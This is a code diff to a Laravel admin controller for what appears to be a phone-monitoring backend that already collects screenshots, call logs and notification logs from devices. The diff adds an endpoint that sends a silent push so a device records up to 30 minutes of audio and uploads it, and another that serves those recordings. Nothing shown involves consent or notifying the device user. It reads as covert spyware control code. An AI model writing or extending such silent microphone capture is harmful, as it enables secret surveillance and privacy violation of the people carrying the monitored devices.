@@ -54,7 +54,11 @@ class AdminController extends Controller
             ->orderByDesc('posted_at')
             ->paginate(30, ['*'], 'notifications_page');
 
-        return view('admin.device-detail', compact('device', 'screenshots', 'callLogs', 'activityLogs', 'notificationLogs'));
+        $audioRecordings = $device->audioRecordings()
+            ->orderByDesc('recorded_at')
+            ->paginate(15, ['*'], 'audio_page');
+
+        return view('admin.device-detail', compact('device', 'screenshots', 'callLogs', 'activityLogs', 'notificationLogs', 'audioRecordings'));
     }
 
     /**
@@ -173,5 +177,67 @@ class AdminController extends Controller
         }
 
         return response()->file($path);
+    }
+
+    /**
+     * Request dynamic voice/audio recording via FCM.
+     */
+    public function requestAudio(Device $device, Request $request, FcmService $fcmService): JsonResponse
+    {
+        $request->validate([
+            'duration_seconds' => 'required|integer|min:5|max:1800',
+        ]);
+
+        if (!$device->fcm_token) {
+            return response()->json([
+                'success' => false,
+                'message' => 'Device has no FCM token registered.',
+            ], 422);
+        }
+
+        $duration = (int) $request->duration_seconds;
+
+        $sent = $fcmService->sendSilentPush($device->fcm_token, 'record_audio', [
+            'duration_seconds' => $duration
+        ]);
+
+        if ($sent) {
+            ActivityLog::create([
+                'device_id' => $device->id,
+                'event_type' => 'request_audio',
+                'metadata' => [
+                    'duration_seconds' => $duration,
+                    'requested_at' => now()->toIso8601String(),
+                ],
+                'event_at' => now(),
+            ]);
+
+            return response()->json([
+                'success' => true,
+                'message' => "Audio recording request sent. Audio will be recorded for {$duration} seconds and uploaded.",
+            ]);
+        }
+
+        return response()->json([
+            'success' => false,
+            'message' => 'Failed to send FCM push.',
+        ], 500);
+    }
+
+    /**
+     * Serve a recorded audio file securely (authenticated proxy).
+     */
+    public function serveAudio(\App\Models\AudioRecording $recording)
+    {
+        $path = storage_path('app/' . $recording->file_path);
+
+        if (!file_exists($path)) {
+            abort(404, 'Audio recording not found.');
+        }
+
+        return response()->file($path, [
+            'Content-Type' => 'audio/mp4',
+            'Content-Disposition' => 'inline; filename="' . basename($path) . '"',
+        ]);
     }
 }
